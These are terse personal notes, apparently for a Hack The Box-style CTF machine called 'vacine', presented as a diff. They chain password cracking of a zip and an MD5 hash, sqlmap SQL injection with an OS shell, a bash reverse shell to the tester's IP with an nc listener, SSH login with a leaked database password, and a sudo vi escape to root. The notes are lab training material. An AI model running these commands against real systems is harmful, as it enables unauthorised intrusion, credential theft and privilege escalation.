@@ -1,0 +1,61 @@
+vacine box
+nmap -sC -sV <ip>
+zip2john <zip file> > vacine.hashes
+john --wordlist=/usr/share/wordlists/rockyou.txt vacine.hashes
+john --show vacine.hashes
+        backup.vacine.zip:741852963::backup.vacine.zip:style.css, index.php:backup.vacine.zip
+                1 password hash cracked, 0 left
+unzip vacine.backup.zip with 741852963 as password
+index.html has
+admin:2cb42f8734ea607eefed3b70af13bbd3
+use hashid to analyse hash type
+use hashcat to crack
+hashcat -a 0 -m 0 vacine.admin.hash /usr/share/wordlists/rockyou.txt
+-a 0 (attack mode) -m 0 (hash = md5) (see hashcat -h for full hash list)
+returns 2cb42f8734ea607eefed3b70af13bbd3:PASSWORD
+
+login into admin account using admin:PASSWORD
+do a search and use burpsuite to get session cookie passed to it
+Cookie: PHPSESSID=eaql3s9ud2la1hbont7agced4o
+use sql map (the session cookie is needed as we are authenticated)
+        sqlmap -u 'http://10.129.208.26/dashboard.php?search=any+query' --cookie="PHPSESSID=eaql3s9ud2la1hbont7agced4o"
+this returns eventually
+        GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
+run the command again (we know that sqlinjection is a vulnerability here) use the --os-shell option
+sqlmap -u 'http://10.129.208.26/dashboard.php?search=any+query' --cookie="PHPSESSID=eaql3s9ud2la1hbont7agced4o" --os-shell
+the above will give us a shell, use the following to make it more stable
+bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
+e.g. where {you_IP} is the tun0 address of the vpn 
+turn on a listener on our machine
+sudo nc -lvnp 443
+we now have a connection via our above listener
+make shell fully interative
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo
+fg
+export TERM=xterm
+the above is probably not fully necessary
+
+the user flag is in /usr/var/postgressql/user.txt
+
+we goto /var/www/html
+look at dashboard.php
+         pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=####");
+we can now login to 10.129.208.26 via ssh as postgres using ####
+ssh postgres@10.129.95.174
+
+we can run vi as sudo to /etc/postgresql/11/main/pg_hba.conf
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+the below does not work as sudo is only set up to run vi
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf -c ':!/bin/sh' /dev/null
+we can set a shell from vi (when we are sudo)
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+then
+:set shell=/bin/sh
+:shell
+
+we now have a shell with root privileges
+goto /root/root.txt
+
